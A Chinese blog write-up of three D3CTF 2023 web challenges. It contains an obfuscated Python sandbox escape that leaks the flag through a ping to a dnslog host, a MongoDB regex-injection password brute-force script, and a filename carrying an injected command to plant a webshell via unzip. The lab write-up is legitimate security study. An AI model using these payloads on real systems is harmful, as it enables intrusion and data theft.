---
title: "2023 D3CTF Web 部分 Writeup"
date: 2023-05-01T22:07:55+08:00
lastmod: 2023-05-01T22:07:55+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

2023 D3CTF

<!--more-->

## Escape Plan

参考 [https://cn-sec.com/archives/1322842.html](https://cn-sec.com/archives/1322842.html)

ping dnslog 外带 flag

```python
import base64

u = '𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫'

CMD = "eval(vars(eval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbigncGluZyBgL3JlYWRmbGFnYC40MWh4aTYuZG5zbG9nLmNuICAnKS5yZWFkKCkg=()))[len([])]))"

CMD = CMD.translate({ord(str(i)): u[i] for i in range(10)})

print(base64.b64encode(CMD.replace('eval', 'ᵉval').encode()).decode())
```

## d3node

右键源代码第一个 hint, 一眼 mongodb 注入

```python
import requests
import time
import json
import re
from urllib.parse import quote

dicts = '0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz'

flag = ''

while True:
    for s in dicts:
        print('testing', s)
        url = 'http://47.102.98.112:32299/user/LoginIndex'
        res = requests.post(url,data=json.dumps({'username': 'admin', 'password': {'$regex': '^' + flag + s}}), headers={'Content-Type': 'application/json'})
        if 'Hacker' in res.text:
            print('error')
            quit()
        if 'invalid' not in res.text:
            flag += s
            print('found!!!', flag)
            break
```

admin 密码为 `dob2xdriaqpytdyh6jo3`

然后登进去右键源码第二个 hint 可以读文件

结合后台给的 setDependencies 和 packDependencies 功能猜测是要通过设置 `package.json` 进行 rce

参考 2022 ByteCTF 的 ctf\_cloud

![image-20230430191556152](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304301916395.png)

SetDependencies

![image-20230430191617226](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304301916256.png)

PackDependencies

![image-20230430191744150](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304301917186.png)

ShwoExampleFile 读文件拿到回显

![image-20230430191807925](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304301918963.png)

## d3cloud

后台 `/admin`

弱口令 admin/admin

登进去发现安装了 [laravel-admin-extensions/media-manager](https://github.com/laravel-admin-extensions/media-manager) 这个插件

里面放了一个 `FilesystemAdapter.php`, 存在 auto unzip 的功能

```php
/**
 * Store the uploaded file on the disk with a given name.
 *
 * @param  string  $path
 * @param  \Illuminate\Http\File|\Illuminate\Http\UploadedFile  $file
 * @param  string  $name
 * @param  array  $options
 * @return string|false
 */
public function putFileAs($path, $file, $name, $options = [])
{
    $supported_file = array('gif','jpg','jpeg','png','ico','zip','mp4','mp3','mkv','avi','txt');
    $file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));
    if (!in_array($file_type, $supported_file)) {
        return false;
    }
    $stream = fopen($file->getRealPath(), 'r+');
    $result = $this->put(
        $path = trim($path.'/'.$name, '/'), $stream, $options
    );
    if (is_resource($stream)) {
        fclose($stream);
    }
    if($file->getClientOriginalExtension() === "zip") {
        $fs = popen("unzip -oq ". $this->driver->getAdapter()->getPathPrefix() . $name ." -d " . $this->driver->getAdapter()->getPathPrefix(),"w");
        pclose($fs);
    }
    return $result ? $path : false;
}
```

很明显存在命令注入

先随便传一个打包好的 shell.zip, 然后再传一次, 把 filename 改成

```
shell.zip -d /var/www/html/public/shell.zip;123.zip
```

![image-20230430195134193](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304301951229.png)

![image-20230430195116974](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202304301951017.png)